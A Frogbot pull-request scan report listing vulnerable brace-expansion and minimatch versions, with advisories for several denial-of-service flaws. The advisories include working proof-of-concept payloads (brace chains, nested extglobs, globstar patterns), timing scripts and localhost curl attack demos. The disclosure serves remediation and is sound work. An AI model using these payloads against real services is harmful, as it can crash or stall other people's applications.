

[comment]: <> (FrogbotReviewComment)

<div align='center'>

[![🚨 Frogbot scanned this pull request and found the below:](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/vulnerabilitiesBannerPR.png)](https://jfrog.com/help/r/jfrog-security-user-guide/shift-left-on-security/frogbot)

</div>



## 📗 Scan Summary
- Frogbot scanned for vulnerabilities and found 11 issues

| Scan Category                | Status                  | Security Issues                  |
| --------------------- | :-----------------------------------: | ----------------------------------- |
| **Software Composition Analysis** | ✅ Done | <details><summary><b>11 Issues Found</b></summary><img src="https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/smallHigh.svg" alt=""/> 10 High<br><img src="https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/smallMedium.svg" alt=""/> 1 Medium<br></details> |
| **Contextual Analysis** | ✅ Done | - |
| **Static Application Security Testing (SAST)** | ✅ Done | Not Found |
| **Secrets** | ✅ Done | - |
| **Services** | ℹ️ Not Scanned | - |
| **Infrastructure as Code (IaC)** | ✅ Done | Not Found |

### 📦 Vulnerable Dependencies

| Severity                | ID                  | Contextual Analysis                  | Dependency Path                  |
| :---------------------: | :-----------------------------------: | :-----------------------------------: | ----------------------------------- |
| ![medium](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/applicableMediumSeverity.png)<br>  Medium | CVE-2026-102277 | Not Covered | <details><summary><b>1 Transitive</b></summary>brace-expansion:1.1.12<br></details> |
| ![high (not applicable)](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/notApplicableHigh.png)<br>    High | CVE-2026-69152 | Not Applicable | <details><summary><b>1 Transitive</b></summary>brace-expansion:1.1.12<br></details> |
| ![high (not applicable)](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/notApplicableHigh.png)<br>    High | CVE-2026-33750 | Not Applicable | <details><summary><b>1 Transitive</b></summary>brace-expansion:1.1.12<br></details> |
| ![high (not applicable)](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/notApplicableHigh.png)<br>    High | CVE-2026-27904 | Not Applicable | <details><summary><b>1 Direct</b></summary>minimatch:3.0.4<br></details> |
| ![high (not applicable)](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/notApplicableHigh.png)<br>    High | CVE-2026-27903 | Not Applicable | <details><summary><b>1 Direct</b></summary>minimatch:3.0.4<br></details> |
| ![high (not applicable)](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/notApplicableHigh.png)<br>    High | CVE-2026-26996 | Not Applicable | <details><summary><b>1 Direct</b></summary>minimatch:3.0.4<br></details> |
| ![high (not applicable)](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/notApplicableHigh.png)<br>    High | CVE-2026-14257 | Not Applicable | <details><summary><b>1 Transitive</b></summary>brace-expansion:1.1.12<br></details> |
| ![high (not applicable)](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/notApplicableHigh.png)<br>    High | CVE-2026-13149 | Not Applicable | <details><summary><b>1 Transitive</b></summary>brace-expansion:1.1.12<br></details> |
| ![high (not applicable)](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/notApplicableHigh.png)<br>    High | CVE-2026-102278 | Not Applicable | <details><summary><b>1 Transitive</b></summary>brace-expansion:1.1.12<br></details> |
| ![high (not applicable)](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/notApplicableHigh.png)<br>    High | CVE-2026-102276 | Not Applicable | <details><summary><b>1 Transitive</b></summary>brace-expansion:1.1.12<br></details> |
| ![high (not applicable)](https://raw.githubusercontent.com/jfrog/frogbot/master/resources/v2/notApplicableHigh.png)<br>    High | CVE-2022-3517 | Not Applicable | <details><summary><b>1 Direct</b></summary>minimatch:3.0.4<br></details> |

### 🔖 Details


<details><summary><b>[ CVE-2026-102277 ] brace-expansion 1.1.12</b></summary>

### Vulnerability Details
|                 |                   |
| --------------------- | :-----------------------------------: |
| **Contextual Analysis:** | Not Covered |
| **CVSS V3:** | 5.3 |
| **Dependency Path:** | <details><summary><b>brace-expansion: 1.1.12 (Transitive)</b></summary>Fix Version: 1.1.21<br></details> |

### Summary

Expanding `{a},b}`-shaped input takes time quadratic in the number of literal `}` characters, blocking the event loop.

Bash preserves a quirk where a brace group followed by a comma set still expands (`{a},b}`). The parser implements this by rewriting the string and restarting the scan. Each pass absorbs exactly one `}` and re-scans from the beginning, so `n` trailing braces cost `n` full passes.

### Reproduction

```js
const build = n => '{a}' + '}'.repeat(n) + ',z}'

for (const n of [8000, 16000, 32000, 64000, 128000]) {
  const t = Date.now()
  expand(build(n))
  console.log(n, Date.now() - t + 'ms')
}
```

| n | input | time | results |
|---|---|---|---|
| 8,000 | 8 KB | 110 ms | 2 |
| 16,000 | 16 KB | 446 ms | 2 |
| 32,000 | 32 KB | 1.7 s | 2 |
| 64,000 | 64 KB | 6.9 s | 2 |
| 128,000 | 128 KB | **27.7 s** | 2 |

`ms/n^2` is flat at ~1.7 and each doubling of `n` costs exactly 4.0x - quadratic. 128 KB of input blocks the event loop for nearly half a minute to produce two results.

### Mechanism

Instrumenting the rewrite branch confirms it runs exactly `n + 1` times, once per literal `}`, each re-scanning the whole string.

There is a second multiplier. The rewrite replaces the group's closing `}` with the internal `escClose` sentinel, which is `'\0CLOSE' + Math.random() + '\0'` - about 25 characters. The working string therefore *grows* by ~25 characters on every pass:

| n | input length | final string length |
|---|---|---|
| 1,000 | 1,006 | 26,006 |
| 8,000 | 8,006 | 208,006 |

So the input is inflated roughly 26x, and that factor multiplies both the quadratic constant and peak memory. This makes it partly a memory-pressure issue as well as a CPU one.

### Why `max` and `maxLength` do not help

The cost is in parsing, before the result set exists. The payload yields 2 results regardless of size, so neither bound is ever reached.

### Impact

An application passing an untrusted pattern to `expand()`, directly or through `minimatch` / `glob`, can have its event loop blocked for tens of seconds by a payload well under minimatch's 65,536-character cap. For a single-threaded Node server that is a full stall, not just a slow request.

Degraded availability rather than a crash - the process recovers once the expansion completes.

### Affected versions

Verified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, all within a few percent of each other (~460-490 ms at n=16,000).

### Patch

The rewrite loop gets an iteration bound. Past the cap the remaining string is treated as non-expanding and returned literally, consistent with the existing `max` / `maxLength` caps, which truncate rather than throw.

Note this bounds the number of passes, not the cost of each: worst-case work remains proportional to `cap x input length`. The cap is set low enough that the residual is bounded in practice, and far above what any realistic `{a},b}` input needs.

### Severity note

Scored 5.3 Medium (`A:L`) for consistency with GHSA-3jxr-9vmj-r5cp, the other algorithmic-complexity advisory on this package (CWE-407), which uses the same vector. The stack-exhaustion advisories on this package score `A:H` because they crash the process outright; this one stalls it.<br></details>

<details><summary><b>[ CVE-2026-69152 ] brace-expansion 1.1.12</b></summary>

### Vulnerability Details
|                 |                   |
| --------------------- | :-----------------------------------: |
| **Contextual Analysis:** | Not Applicable |
| **CVSS V3:** | 7.5 |
| **Dependency Path:** | <details><summary><b>brace-expansion: 1.1.12 (Transitive)</b></summary>Fix Version: 1.1.18<br></details> |

### Summary

The `maxLength` mitigation added in `5.0.8` for GHSA-mh99-v99m-4gvg / CVE-2026-14257 is incomplete. It bounds the accumulator where results are *combined*, but not the intermediate arrays that feed it. A ~25 KB input still crashes the Node process with an **uncatchable** out-of-memory error, so `try/catch` around `expand()` does not help.

A second, related path in the same function lets a ~400 KB input block the event loop for over two minutes without ever exceeding the memory bound.

### Details

`maxLength` was enforced in `combine()`, the single place output grows. Two arrays are built *before* `combine()` runs, and neither was bounded.

**1. Comma alternatives accumulate without a running total (memory exhaustion)**

Each alternative in `{a,b,c,...}` is expanded by its own recursive `expand_()` call, so each receives a full, independent `maxLength` allowance. The results were then concatenated into a single `values` array with no cumulative limit:

```js
values = []
for (let j = 0; j < n.length; j++) {
  values.push.apply(values, expand_(n[j], max, maxLength, false))
}

acc = combine(acc, pre, values, max, maxLength, ...)
```

With `A` alternatives, `values` can reach `A * maxLength` characters before `combine()` gets a chance to truncate it. At the default `maxLength` of 4,000,000 and 400 alternatives, that is well past any default heap.

**2. Padded sequences ignore `maxLength` while generating (CPU exhaustion)**

`expandSequence()` was bounded by `max` (the result *count*) but never consulted `maxLength`. A padded sequence's element width follows the input, so `{0...01..100000}` with a wide pad generates `max` elements, each as wide as the input, only for `combine()` to discard all but a handful.

Memory stays flat here, because V8 represents the padded strings as cons-strings, which is likely why this path was not caught alongside the original issue. The cost is time: work proportional to `max * width`.

| pad width | input bytes | results kept | time (5.0.8) | time (patched) |
|---|---|---|---|---|
| 20,000 | 20 KB | 199 | ~7.3 s | ~20 ms |
| 100,000 | 100 KB | 39 | ~32 s | ~20 ms |
| 400,000 | 400 KB | 9 | ~124 s | ~18 ms |

Output is byte-identical before and after the fix; only the wasted work is removed.

### Proof of concept

Memory exhaustion, against `5.0.8`:

```js
import { expand } from 'brace-expansion'

const part = '{' + '0'.repeat(50) + '1..100000}'
const input = '{' + Array(400).fill(part).join(',') + '}'  // ~25 KB

try {
  expand(input)
} catch (e) {
  // never reached - the process is already dead
}
```

```
FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory
Aborted
```

Event-loop stall, against `5.0.8`:

```js
import { expand } from 'brace-expansion'

// ~400 KB input, returns 9 results after roughly two minutes of blocking CPU
expand('{' + '0'.repeat(400_000) + '1..100000}')
```

### Impact

Denial of service. Any application that passes attacker-controlled input to `expand()`, directly or transitively through a glob or pattern-matching library, can be remotely crashed or stalled. The out-of-memory variant terminates the process and cannot be handled with `try/catch`.

Applications already on `5.0.8` are affected: the `5.0.8` mitigation does not cover these paths.

### Patches

Both intermediate arrays are now bounded as they are built, using the same `max` and `maxLength` limits already applied in `combine()`:

- `values` tracks a running result count and character length while alternatives are appended, and stops once either bound is reached.
- `expandSequence()` accepts `maxLength` and stops generating once the sequence's own characters reach it.

As with the existing limits, output is truncated rather than allowed to grow without bound, which matches how `max` already behaves. The defaults sit well above any realistic expansion, so legitimate input is unaffected.

### Workarounds

If upgrading is not immediately possible, avoid passing untrusted input to `expand()` or to glob brace patterns, or pass an explicitly small `max` **and** `maxLength`.

Note that a small `maxLength` alone was not sufficient on affected versions: it was applied per alternative rather than cumulatively, which is the root of the first issue above.

### Credits

The memory-exhaustion bypass was reported by Alessio Della Libera, CEO & Co-founder at [Numyra](https://numyra.ai/).

The sequence-generation issue was found while verifying that report.<br></details>

<details><summary><b>[ CVE-2026-33750 ] brace-expansion 1.1.12</b></summary>

### Vulnerability Details
|                 |                   |
| --------------------- | :-----------------------------------: |
| **Contextual Analysis:** | Not Applicable |
| **CVSS V3:** | 7.5 |
| **Dependency Path:** | <details><summary><b>brace-expansion: 1.1.12 (Transitive)</b></summary>Fix Version: 1.1.13<br></details> |

### Impact

A brace pattern with a zero step value (e.g., `{1..2..0}`) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.

The loop in question:

https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184

`test()` is one of

https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113

The increment is computed as `Math.abs(0) = 0`, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a `RangeError`. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.

This affects any application that passes untrusted strings to expand(), or by error sets a step value of `0`. That includes tools built on minimatch/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.

### Patches


Upgrade to versions
- 5.0.5+

A step increment of 0 is now sanitized to 1, which matches bash behavior.

### Workarounds

Sanitize strings passed to `expand()` to ensure a step value of `0` is not used.<br></details>

<details><summary><b>[ CVE-2026-27904 ] minimatch 3.0.4</b></summary>

### Vulnerability Details
|                 |                   |
| --------------------- | :-----------------------------------: |
| **Contextual Analysis:** | Not Applicable |
| **CVSS V3:** | 7.5 |
| **Dependency Path:** | <details><summary><b>minimatch: 3.0.4 (Direct)</b></summary>Fix Version: 3.1.4<br></details> |

### Summary

Nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.

---

### Details

The root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:

```typescript
: this.type === '*' && bodyDotAllowed ? `)?`
: `)${this.type}`
```

This produces the following regexps:

| Pattern              | Generated regex                          |
|----------------------|------------------------------------------|
| `*(a\|b)`            | `/^(?:a\|b)*$/`                          |
| `*(*(a\|b))`         | `/^(?:(?:a\|b)*)*$/`                     |
| `*(*(*(a\|b)))`      | `/^(?:(?:(?:a\|b)*)*)*$/`               |
| `*(*(*(*(a\|b))))` | `/^(?:(?:(?:(?:a\|b)*)*)*)*$/`          |

These are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.

The generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.

Measured times via `minimatch()`:

| Pattern              | Input              | Time       |
|----------------------|--------------------|------------|
| `*(*(a\|b))`         | `a` x30 + `z`      | ~68,000ms  |
| `*(*(*(a\|b)))`      | `a` x20 + `z`      | ~124,000ms |
| `*(*(*(*(a\|b))))` | `a` x25 + `z`      | ~116,000ms |
| `*(a\|a)`            | `a` x25 + `z`      | ~2,000ms   |

Depth inflection at fixed input `a` x16 + `z`:

| Depth | Pattern              | Time         |
|-------|----------------------|--------------|
| 1     | `*(a\|b)`            | 0ms          |
| 2     | `*(*(a\|b))`         | 4ms          |
| 3     | `*(*(*(a\|b)))`      | 270ms        |
| 4     | `*(*(*(*(a\|b))))` | 115,000ms    |

Going from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.

---

### PoC

Tested on minimatch@10.2.2, Node.js 20.

**Step 1 -- verify the generated regexps and timing (standalone script)**

Save as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:

```javascript
import { minimatch, Minimatch } from 'minimatch'

function timed(fn) {
  const s = process.hrtime.bigint()
  let result, error
  try { result = fn() } catch(e) { error = e }
  const ms = Number(process.hrtime.bigint() - s) / 1e6
  return { ms, result, error }
}

// Verify generated regexps
for (let depth = 1; depth <= 4; depth++) {
  let pat = 'a|b'
  for (let i = 0; i < depth; i++) pat = `*(${pat})`
  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()
  console.log(`depth=${depth} "${pat}" -> ${re}`)
}
// depth=1 "*(a|b)"          -> /^(?:a|b)*$/
// depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
// depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
// depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/

// Safe-length timing (exponential growth confirmation without multi-minute hang)
const cases = [
  ['*(*(*(a|b)))', 15],   // ~270ms
  ['*(*(*(a|b)))', 17],   // ~800ms
  ['*(*(*(a|b)))', 19],   // ~2400ms
  ['*(*(a|b))',    23],   // ~260ms
  ['*(a|b)',      101],   // <5ms (depth=1 control)
]
for (const [pat, n] of cases) {
  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat))
  console.log(`"${pat}" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)
}

// Confirm noext disables the vulnerability
const t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }))
console.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)

// +() is equally affected
const t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'))
console.log(`"+(+(+(a|b)))" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)
```

Observed output:
```
depth=1 "*(a|b)"          -> /^(?:a|b)*$/
depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/
"*(*(*(a|b)))" n=15: 269ms result=false
"*(*(*(a|b)))" n=17: 268ms result=false
"*(*(*(a|b)))" n=19: 2408ms result=false
"*(*(a|b))"    n=23: 257ms result=false
"*(a|b)"       n=101: 0ms result=false
noext=true: 0ms (should be ~0ms)
"+(+(+(a|b)))" n=18: 6300ms result=false
```

**Step 2 -- HTTP server (event loop starvation proof)**

Save as `poc4-server.mjs`:

```javascript
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3001
http.createServer((req, res) => {
  const url     = new URL(req.url, `http://localhost:${PORT}`)
  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern="${pattern}" path="${path.slice(0,30)}"`)
  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
}).listen(PORT, () => console.log(`listening on ${PORT}`))
```

Terminal 1 -- start the server:
```
node poc4-server.mjs
```

Terminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:
```
curl "http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz" &
```

Terminal 3 -- send a benign request while the attack is in-flight:
```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz"
```

**Observed output -- Terminal 2 (attack):**
```
{"result":false,"ms":"64149"}
```

**Observed output -- Terminal 3 (benign, concurrent):**
```
{"result":false,"ms":"0"}

time_total: 63.022047s
```

**Terminal 1 (server log):**
```
[2026-02-20T09:41:17.624Z] pattern="*(*(*(a|b)))" path="aaaaaaaaaaaaaaaaaaaz"
[2026-02-20T09:42:21.775Z] done in 64149ms result=false
[2026-02-20T09:42:21.779Z] pattern="*(a|b)" path="aaaz"
[2026-02-20T09:42:21.779Z] done in 0ms result=false
```

The server reports `"ms":"0"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.

Note: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.

---

### Impact

Any context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.

Depth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.

`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).

**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.<br></details>

<details><summary><b>[ CVE-2026-27903 ] minimatch 3.0.4</b></summary>

### Vulnerability Details
|                 |                   |
| --------------------- | :-----------------------------------: |
| **Contextual Analysis:** | Not Applicable |
| **CVSS V3:** | 7.5 |
| **Dependency Path:** | <details><summary><b>minimatch: 3.0.4 (Direct)</b></summary>Fix Version: 3.1.3<br></details> |

### Summary

`matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.

---

### Details

The vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960):

```typescript
while (fr < fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
```

When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).

There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.

Measured timing with n=30 path segments:

| k (globstars) | Pattern size | Time     |
|---------------|--------------|----------|
| 7             | 36 bytes     | ~154ms   |
| 9             | 46 bytes     | ~1.2s    |
| 11            | 56 bytes     | ~5.4s    |
| 12            | 61 bytes     | ~9.7s    |
| 13            | 66 bytes     | ~15.9s   |

---

### PoC

Tested on minimatch@10.2.2, Node.js 20.

**Step 1 -- inline script**

```javascript
import { minimatch } from 'minimatch'

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'
const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'

const start = Date.now()
minimatch(path, pattern)
console.log(Date.now() - start + 'ms') // ~1200ms
```

To scale the effect, increase k:

```javascript
// k=11 -> ~5.4s, k=13 -> ~15.9s
const k = 11
const pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b'
const path    = Array(30).fill('a').join('/')
minimatch(path, pattern)
```

No special options are required. This reproduces with the default `minimatch()` call.

**Step 2 -- HTTP server (event loop starvation proof)**

The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:

```javascript
// poc1-server.mjs
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3000

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`)
  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }

  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
})

server.listen(PORT)
```

Terminal 1 -- start the server:
```
node poc1-server.mjs
```

Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:
```
curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &
```

Terminal 3 -- while the attack is in-flight, send a benign request:
```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz"
```

**Observed output (Terminal 3):**
```
{"result":true,"ms":"0"}

time_total: 4.132709s
```

The server reports `"ms":"0"` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:

```
{"result":true,"ms":"0"}

time_total: 0.001599s
```

---

### Impact

Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.<br></details>

<details><summary><b>[ CVE-2026-26996 ] minimatch 3.0.4</b></summary>

### Vulnerability Details
|                 |                   |
| --------------------- | :-----------------------------------: |
| **Contextual Analysis:** | Not Applicable |
| **CVSS V3:** | 7.5 |
| **Dependency Path:** | <details><summary><b>minimatch: 3.0.4 (Direct)</b></summary>Fix Version: 3.1.3<br></details> |

### Summary
`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.

The time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.


### Details
_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._

### PoC
When minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:

```
/^(?!\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/
```

When the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.
### Impact
Any application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:
- File search/filter UIs that accept glob patterns
- `.gitignore`-style filtering with user-defined rules
- Build tools that accept glob configuration
- Any API that exposes glob matching to untrusted input

----

Thanks to @ljharb for back-porting the fix to legacy versions of minimatch.<br></details>

<details><summary><b>[ CVE-2026-14257 ] brace-expansion 1.1.12</b></summary>

### Vulnerability Details
|                 |                   |
| --------------------- | :-----------------------------------: |
| **Contextual Analysis:** | Not Applicable |
| **CVSS V3:** | 7.5 |
| **Dependency Path:** | <details><summary><b>brace-expansion: 1.1.12 (Transitive)</b></summary>Fix Version: 1.1.17<br></details> |

### Summary

`expand()` bounds the *number* of results it produces (the `max` option,
`100_000` by default) but not their *length*. By chaining many brace groups,
an attacker keeps the result count under `max` while making every result grow
with the number of groups. Building `max` long results — plus the intermediate
arrays combined at each brace group — exhausts memory and crashes the Node
process with an **uncatchable** out-of-memory error. `try/catch` around
`expand()` does not help: the fatal error terminates the process.

A ~7.5 KB input (`'{a,b}'.repeat(1500)`) is enough to crash a default Node
process.

### Details

For `N` chained brace groups such as `'{a,b}'.repeat(N)`:

- the result count is `2^N`, immediately capped at `max` (`100_000`), so the
  `max` protection appears to hold, but
- each result is `N` characters long, so the total output size is
  `max × N` characters, which grows without bound in `N`.

`expand_` combines each brace set with the fully-expanded tail:

```js
const post = m.post.length ? expand_(m.post, max, false) : ['']
...
for (let j = 0; j < N.length; j++) {
  for (let k = 0; k < post.length && expansions.length < max; k++) {
    const expansion = pre + N[j] + post[k]   // grows one group longer per level
    ...
    expansions.push(expansion)
  }
}
```

The loop guard `expansions.length < max` limits how many strings are built, but
nothing limits how long they get. Each recursion level materializes another
array of up to `max` strings, one character longer than the level below, and —
because V8 represents `pre + N[j] + post[k]` as a cons-string (rope) that
references `post[k]` — those intermediate strings stay reachable through the
whole chain. Memory therefore scales with `max × N`.

Measured on `5.0.7` (`'{a,b}'.repeat(N)`, default `max`):

| groups (N) | input bytes | result count | peak RSS |
|---|---|---|---|
| 20 | 100 | 100,000 | ~80 MB |
| 50 | 250 | 100,000 | ~214 MB |
| 100 | 500 | 100,000 | ~409 MB |
| 300 | 1,500 | 100,000 | ~1,148 MB |
| 1500 | 7,500 | — | **OOM crash** |

### Proof of concept

```js
const { expand } = require('brace-expansion')

// ~7.5 KB input — crashes the process with a fatal, uncatchable OOM:
//   FATAL ERROR: ... JavaScript heap out of memory
try {
  expand('{a,b}'.repeat(1500))
} catch (e) {
  // never reached — the process is already dead
}
```

### Impact

Any application that passes attacker-influenced strings to
`brace-expansion.expand()` — directly, or transitively via `minimatch` / `glob`
brace patterns — can be crashed by a small request. Because the failure is a
fatal V8 out-of-memory error rather than a thrown exception, it cannot be caught
and it takes down the whole worker/process, denying service.

### Remediation

Upgrade to a patched release. The fix bounds the total number of characters a
single `expand()` call may accumulate (`EXPANSION_MAX_LENGTH`, default
`4_000_000`, configurable via a new `maxLength` option), applied inside the
output-building loops so intermediate arrays are bounded too. Once the limit is
reached, output is truncated — consistent with how `max` already truncates —
instead of growing without bound. The limit sits well above any realistic
expansion (100,000 results hitting `max` measure ~1M characters), so legitimate
input is unaffected.

After the fix, `'{a,b}'.repeat(1500)` returns a bounded, truncated result in
~0.7 s using ~340 MB and never crashes, including under a constrained 512 MB
heap.

